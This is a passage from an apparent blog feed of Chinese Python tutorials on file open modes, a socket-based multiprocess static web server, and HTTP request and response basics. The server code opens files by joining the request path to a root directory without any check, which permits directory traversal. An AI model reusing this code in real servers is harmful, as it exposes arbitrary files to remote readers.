        <content type="html"><![CDATA[<h2 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h2><ul><li>文件打开方式，文本与二进制区别</li><li>用类封装简单的Web静态服务器</li></ul><a id="more"></a><h2 id="0x01-文件打开方式，文本与二进制区别"><a href="#0x01-文件打开方式，文本与二进制区别" class="headerlink" title="0x01 文件打开方式，文本与二进制区别"></a>0x01 文件打开方式，文本与二进制区别</h2><blockquote><p>文本文件，操作系统会对<code>\n</code>进行一些隐式变换，因此文本文件直接跨平台使用会出问题。<br>在Windows下，写入<code>\n</code>时，操作系统会隐式的将<code>\n</code>转换为<code>\r\n</code>，再写入到文件中；读的时候，会把<code>\r\n</code>隐式转化为<code>\n</code>，再读到变量中。<br>在Linux下，写入’\n’时，操作系统不做隐式变换。<br>二进制文件，操作系统不会对<code>\n</code>进行隐式变换，很多二进制文件（如电影、图片等）可以跨平台使用。</p></blockquote><ul><li>以二进制形式写入wb文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f= open(<span class="string">"wb"</span>,<span class="string">"wb"</span>)</span><br><span class="line">f.write(<span class="string">b"hello\nhello"</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><ul><li>以文本方式写入w文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f= open(<span class="string">"w"</span>,<span class="string">"w"</span>)</span><br><span class="line">f.write(<span class="string">"hello\nhello"</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>使用Notepad++打开wb和w文件显示并无任何区别</p><ul><li>分别读取观察,发现windows中文本读取将<code>\n</code>变为<code>\r\n</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"wb"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.read())</span><br></pre></td></tr></table></figure><pre><code>b&apos;hello\nhello&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"w"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.read())</span><br></pre></td></tr></table></figure><pre><code>b&apos;hello\r\nhello&apos;</code></pre><h2 id="0x02-python使用类封装Web静态服务器"><a href="#0x02-python使用类封装Web静态服务器" class="headerlink" title="0x02 python使用类封装Web静态服务器"></a>0x02 python使用类封装Web静态服务器</h2><ul><li>代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">HTML_ROOT_DIR = <span class="string">"./html"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPserver</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""init"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.server_socket.listen(<span class="number">128</span>)</span><br><span class="line">        <span class="string">"""多进程处理请求"""</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, client_address = self.server_socket.accept()</span><br><span class="line">            print(<span class="string">"[%s,%s]用户连接上了"</span> % client_address)</span><br><span class="line">            handle_client_process = Process(target=self.handle_client, args=(client_socket,))</span><br><span class="line">            handle_client_process.start()</span><br><span class="line">            client_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(self,client_socket)</span>:</span></span><br><span class="line">        <span class="string">"""处理客户端请求"""</span></span><br><span class="line">        <span class="comment"># 获取客户端数据</span></span><br><span class="line">        request_data = client_socket.recv(<span class="number">2048</span>)</span><br><span class="line">        print(<span class="string">"request data:"</span>,request_data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理请求数据</span></span><br><span class="line">        request_lines = request_data.splitlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> request_lines:</span><br><span class="line">            print(line)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># "GET / HTTP/1.1"</span></span><br><span class="line">        request_start_line = request_lines[<span class="number">0</span>]</span><br><span class="line">        file_name = re.match(<span class="string">r"\w+ +(/[^ ]*)"</span>,request_start_line.decode(<span class="string">"utf-8"</span>)).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"/"</span> == file_name:</span><br><span class="line">            file_name= <span class="string">"/index.html"</span></span><br><span class="line">        <span class="comment"># 打开文件</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file = open(HTML_ROOT_DIR+file_name,<span class="string">"rb"</span>)</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            <span class="comment"># 构造响应数据</span></span><br><span class="line">            response_start_line = <span class="string">"HTTP/1.1 404 Not Found\r\n"</span></span><br><span class="line">            response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">            response_body = <span class="string">"file is not found!"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_data = file.read()</span><br><span class="line">            file.close()</span><br><span class="line">            <span class="comment"># 构造响应数据</span></span><br><span class="line">            response_start_line = <span class="string">"HTTP/1.1 200 0k\r\n"</span></span><br><span class="line">            response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">            response_body = file_data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        response = response_start_line + response_headers+ <span class="string">"\r\n"</span>+ response_body</span><br><span class="line">        print(<span class="string">"response:"</span>,response)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 向客户端发送数据</span></span><br><span class="line">        client_socket.send(bytes(response,<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="comment"># 关闭客户端连接</span></span><br><span class="line">        client_socket.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bind</span><span class="params">(self,port)</span>:</span></span><br><span class="line">        self.server_socket.bind((<span class="string">""</span>, port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    http_server = HTTPserver()</span><br><span class="line">    http_server.bind(<span class="number">8000</span>)</span><br><span class="line">    http_server.start()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-Web服务器】1.3 python-Web静态服务器-2-显示需要的页面</title>
      <link href="/2020/04/06/1.3%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-2-%E6%98%BE%E7%A4%BA%E9%9C%80%E8%A6%81%E7%9A%84%E9%A1%B5%E9%9D%A2/"/>
      <url>/2020/04/06/1.3%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-2-%E6%98%BE%E7%A4%BA%E9%9C%80%E8%A6%81%E7%9A%84%E9%A1%B5%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<p>本文使用python写个可以显示需要页面的Web静态服务器。</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">HTML_ROOT_DIR = <span class="string">"./html"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="string">"""处理客户端请求"""</span></span><br><span class="line">    <span class="comment"># 获取客户端数据</span></span><br><span class="line">    request_data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">"request data:"</span>,request_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理请求数据</span></span><br><span class="line">    request_lines = request_data.splitlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> request_lines:</span><br><span class="line">        print(line)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># "GET / HTTP/1.1"</span></span><br><span class="line">    request_start_line = request_lines[<span class="number">0</span>]</span><br><span class="line">    file_name = re.match(<span class="string">r"\w+ +(/[^ ]*)"</span>,request_start_line.decode(<span class="string">"utf-8"</span>)).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"/"</span> == file_name:</span><br><span class="line">        file_name= <span class="string">"/index.html"</span></span><br><span class="line">    <span class="comment"># 打开文件</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file = open(HTML_ROOT_DIR+file_name,<span class="string">"rb"</span>)</span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        <span class="comment"># 构造响应数据</span></span><br><span class="line">        response_start_line = <span class="string">"HTTP/1.1 404 Not Found\r\n"</span></span><br><span class="line">        response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">        response_body = <span class="string">"file is not found!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        file_data = file.read()</span><br><span class="line">        file.close()</span><br><span class="line">        <span class="comment"># 构造响应数据</span></span><br><span class="line">        response_start_line = <span class="string">"HTTP/1.1 200 0k\r\n"</span></span><br><span class="line">        response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">        response_body = file_data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    response = response_start_line + response_headers+ <span class="string">"\r\n"</span>+ response_body</span><br><span class="line">    print(<span class="string">"response:"</span>,response)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 向客户端发送数据</span></span><br><span class="line">    client_socket.send(bytes(response,<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="comment"># 关闭客户端连接</span></span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    server_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,<span class="number">1</span>)</span><br><span class="line">    server_socket.bind((<span class="string">""</span>,<span class="number">8000</span>))</span><br><span class="line">    server_socket.listen(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, client_address = server_socket.accept()</span><br><span class="line">        print(<span class="string">"[%s,%s]用户连接上了"</span>%client_address)</span><br><span class="line">        handle_client_process = Process(target=handle_client, args=(client_socket,))</span><br><span class="line">        handle_client_process.start()</span><br><span class="line">        client_socket.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-Web服务器】1.2 python-Web静态服务器-1-显示固定的页面</title>
      <link href="/2020/04/06/1.2%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1-%E6%98%BE%E7%A4%BA%E5%9B%BA%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2/"/>
      <url>/2020/04/06/1.2%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1-%E6%98%BE%E7%A4%BA%E5%9B%BA%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<p>本文使用python写个简单的Web静态服务器</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line">HTML_ROOT_DIR = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="string">"""处理客户端请求"""</span></span><br><span class="line">    <span class="comment"># 获取客户端数据</span></span><br><span class="line">    request_data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">"request data:"</span>,request_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造响应数据</span></span><br><span class="line">    response_start_line = <span class="string">"HTTP/1.1 200 0k\r\n"</span></span><br><span class="line">    response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">    response_body = <span class="string">"hello world"</span></span><br><span class="line">    response = response_start_line + response_headers+ <span class="string">"\r\n"</span>+ response_body</span><br><span class="line">    print(<span class="string">"response:"</span>,response)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 向客户端发送数据</span></span><br><span class="line">    client_socket.send(bytes(response,<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="comment"># 关闭客户端连接</span></span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    server_socket.bind((<span class="string">""</span>,<span class="number">8000</span>))</span><br><span class="line">    server_socket.listen(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, client_address = server_socket.accept()</span><br><span class="line">        print(<span class="string">"[%s,%s]用户连接上了"</span>%client_address)</span><br><span class="line">        handle_client_process = Process(target=handle_client, args=(client_socket,))</span><br><span class="line">        handle_client_process.start()</span><br><span class="line">        client_socket.close()</span><br></pre></td></tr></table></figure><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python06.png" alt=""></p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python07.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-Web服务器】1.1 HTTP协议简介</title>
      <link href="/2020/04/06/1.1%20HTTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/"/>
      <url>/2020/04/06/1.1%20HTTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>本文主要结合浏览器开发者工具理解HTTP协议，分析浏览器与服务器之间的请求和响应。</p><a id="more"></a><h3 id="0x01-使用谷歌-火狐浏览器分析"><a href="#0x01-使用谷歌-火狐浏览器分析" class="headerlink" title="0x01 使用谷歌/火狐浏览器分析"></a>0x01 使用谷歌/火狐浏览器分析</h3><ul><li><p>在Web应用中，服务器把网页传给浏览器，实际上就是把网页的HTML代码发送给浏览器，让浏览器显示出来。而浏览器和服务器之间的传输协议是HTTP,所以：</p><ul><li>HTML是一种用来定义网页的文本</li><li>HTTP是在网络上传输HTML的协议，用于浏览器和服务器的通信</li></ul></li><li><p>Chrome浏览器提供了完整的调试工具，非常适合Web开发。在Chrome浏览器（更多工具–&gt;开发者工具）或者Windows下F12<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python01.png" alt=""><br>说明</p><ul><li>Elements显示网页的结构</li><li>Network显示浏览器和服务器的通信</li></ul></li></ul><p>点击Network，确保第一个小红灯亮着，Chrome就会记录所有浏览器和服务器之间的通信：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python02.png" alt=""></p><h3 id="0x02-HTTP协议分析"><a href="#0x02-HTTP协议分析" class="headerlink" title="0x02 HTTP协议分析"></a>0x02 HTTP协议分析</h3><p>当在地址栏输入<code>www.baidu.com</code>时,浏览器显示百度首页。在这个过 程中，浏览器都干了哪些事情呢？通过Network的记录，我们就可以知道。 在Network中，找到<code>www.baidu.com</code>那条记录，点击，右侧将显示Request Headers，点击右侧的view-source，我们就可以看到浏览器发给百度服务器的请求：</p><h4 id="2-1-浏览器请求"><a href="#2-1-浏览器请求" class="headerlink" title="2.1 浏览器请求"></a>2.1 浏览器请求</h4><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python03.png" alt=""></p><ul><li>说明：（最主要的头两⾏分析如下）<ul><li>第⼀⾏<code>GET / HTTP/1.1</code>：GET表示⼀个读取请求，将从服务器获得⽹⻚数据，/表示URL的路径，URL 总是以/开头，/就表示⾸⻚，最后的HTTP/1.1指示采⽤的HTTP协议版本是 1.1。⽬前HTTP协议的版本就是1.1，但是⼤部分服务器也⽀持1.0版本，主 要区别在于1.1版本允许多个HTTP请求复⽤⼀个TCP连接，以加快传输速 度。</li><li>从第⼆⾏开始，每⼀⾏都类似于Xxx: abcdefg：<br><code>Host: www.baidu.com</code>，表示请求的域名是<code>www.baidu.com</code>。如果⼀台服务器有多个⽹站，服务器就需 要通过Host来区分浏览器请求的是哪个⽹站。</li></ul></li></ul><h4 id="2-2-服务器响应"><a href="#2-2-服务器响应" class="headerlink" title="2.2 服务器响应"></a>2.2 服务器响应</h4><p>继续找到Response Headers，点击view-source，显示服务器返回的原始响应数据：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python04.png" alt=""></p><ul><li>HTTP响应分为Header和Body两部分（Body是可选项），我们在Network中 看到的Header最重要的⼏⾏如下：<ul><li><code>HTTP/1.1 200 OK</code>：200表示⼀个成功的响应，后⾯的OK是说明。</li></ul></li><li>如果返回的不是200，那么往往有其他的功能，例如<ul><li>失败的响应有404    Not    Found：网⻚不存在</li><li>500    Internal Server    Error：服务器内部出错 </li><li>等等…</li></ul></li><li><code>Content-Type:text/html</code>：Content-Type指示响应的内容，这⾥是text/html表示HTML⽹⻚。<blockquote><p>请注意，浏览器就是依靠Content-Type来判断响应的内容是网页还是图⽚，是视频还是⾳乐。浏览器并不靠URL来判断响应的内容，所以，即使URL是    <code>http://www.baidu.com/meimei.jpg</code>，它也不⼀定就是图⽚。</p></blockquote></li><li>HTTP响应的Body就是HTML源码，右键查看网页源码，就是查看响应的body<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python05.png" alt=""></li></ul><h5 id="浏览器解析过程"><a href="#浏览器解析过程" class="headerlink" title="浏览器解析过程"></a>浏览器解析过程</h5><blockquote><p>当浏览器读取到百度⾸⻚的HTML源码后，它会解析HTML，显示⻚⾯，然后，根据HTML⾥⾯的各种链接，再发送HTTP请求给百度服务器，拿到相应的图⽚、视频、Flash、JavaScript脚本、CSS等各种资源，最终显示出⼀个完整的⻚⾯。所以我们在Network下⾯能看到很多额外的HTTP请求</p></blockquote><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><h4 id="3-1-HTTP请求"><a href="#3-1-HTTP请求" class="headerlink" title="3.1 HTTP请求"></a>3.1 HTTP请求</h4><h5 id="步骤1：浏览器⾸先向服务器发送HTTP请求，请求包括："><a href="#步骤1：浏览器⾸先向服务器发送HTTP请求，请求包括：" class="headerlink" title="步骤1：浏览器⾸先向服务器发送HTTP请求，请求包括："></a>步骤1：浏览器⾸先向服务器发送HTTP请求，请求包括：</h5><ul><li>⽅法：GET还是POST，GET仅请求资源，POST会附带⽤户数据；</li><li>路径：/full/url/path；</li><li>域名：由Host头指定；</li><li>以及其他相关的Header；</li></ul><p>如果是POST，那么请求还包括⼀个Body，包含⽤户数据</p><h5 id="步骤2：服务器向浏览器返回HTTP响应，响应包括："><a href="#步骤2：服务器向浏览器返回HTTP响应，响应包括：" class="headerlink" title="步骤2：服务器向浏览器返回HTTP响应，响应包括："></a>步骤2：服务器向浏览器返回HTTP响应，响应包括：</h5><ul><li>响应代码：200表示成功，3xx表示重定向，4xx表示客户端发送的请求 有错误，5xx表示服务器端处理时发⽣了错误；</li><li>响应类型：由Content-Type指定；</li><li>以及其他相关的Header；</li></ul><p>通常服务器的HTTP响应会携带内容，也就是有⼀个Body，包含响应的 内容，⽹⻚的HTML源码就在Body中。</p><h5 id="步骤3：如果浏览器还需要继续向服务器请求其他资源，-⽐如图⽚，就再次发出HTTP请求，重复步骤1、2"><a href="#步骤3：如果浏览器还需要继续向服务器请求其他资源，-⽐如图⽚，就再次发出HTTP请求，重复步骤1、2" class="headerlink" title="步骤3：如果浏览器还需要继续向服务器请求其他资源， ⽐如图⽚，就再次发出HTTP请求，重复步骤1、2"></a>步骤3：如果浏览器还需要继续向服务器请求其他资源， ⽐如图⽚，就再次发出HTTP请求，重复步骤1、2</h5><blockquote><p>Web采⽤的HTTP协议采⽤了⾮常简单的请求-响应模式，从⽽⼤⼤简化 了开发。当我们编写⼀个⻚⾯时，我们只需要在HTTP请求中把HTML 发送出去，不需要考虑如何附带图⽚、视频等，浏览器如果需要请求图 ⽚和视频，它会发送另⼀个HTTP请求，因此，⼀个HTTP请求只处理 ⼀个资源(此时就可以理解为TCP协议中的短连接，每个链接只获取⼀ 个资源，如需要多个就需要建⽴多个链接)</p></blockquote><h4 id="3-2-HTTP格式"><a href="#3-2-HTTP格式" class="headerlink" title="3.2 HTTP格式"></a>3.2 HTTP格式</h4><p>每个HTTP请求和响应都遵循相同的格式，⼀个HTTP包含Header和Body两 部分，其中Body是可选的。<br>HTTP协议是⼀种⽂本协议，所以，它的格式也⾮常简单</p><h5 id="HTTP-GET请求的格式："><a href="#HTTP-GET请求的格式：" class="headerlink" title="HTTP    GET请求的格式："></a>HTTP    GET请求的格式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET&#x2F;pathHTTP&#x2F;1.1</span><br><span class="line">Header1:Value1</span><br><span class="line">Header2:Value2</span><br><span class="line">Header3:Value3</span><br></pre></td></tr></table></figure><p>每个Header⼀⾏⼀个，换⾏符是\r\n</p><h5 id="HTTP-POST请求的格式："><a href="#HTTP-POST请求的格式：" class="headerlink" title="HTTP    POST请求的格式："></a>HTTP    POST请求的格式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST&#x2F;pathHTTP&#x2F;1.1</span><br><span class="line">Header1:Value1</span><br><span class="line">Header2:Value2</span><br><span class="line">Header3:Value3</span><br><span class="line"></span><br><span class="line">bodydatagoeshere...</span><br></pre></td></tr></table></figure><p>当遇到连续两个\r\n时，Header部分结束，后⾯的数据全部是Body</p><h5 id="HTTP响应的格式："><a href="#HTTP响应的格式：" class="headerlink" title="HTTP响应的格式："></a>HTTP响应的格式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">200OK</span><br><span class="line">Header1:Value1</span><br><span class="line">Header2:Value2</span><br><span class="line">Header3:Value3</span><br><span class="line"></span><br><span class="line">bodydatagoeshere...</span><br></pre></td></tr></table></figure><p>HTTP响应如果包含body，也是通过\r\n\r\n来分隔的</p><blockquote><p>请再次注意，Body的数据类型由Content-Type头来确定，如果是⽹⻚，Body就是⽂本，如果是图⽚，Body就是图⽚的⼆进制数据。</p></blockquote><blockquote><p>当存在Content-Encoding时，Body数据是被压缩的，最常⻅的压缩⽅式是gzip，所以，看到Content-Encoding:gzip时，需要将Body数据先解压缩，才能得到真正的数据。压缩的⽬的在于减少Body的⼤⼩，加快⽹络传输。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【XSS（一）】1.1 XSS介绍与原理</title>
      <link href="/2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/"/>
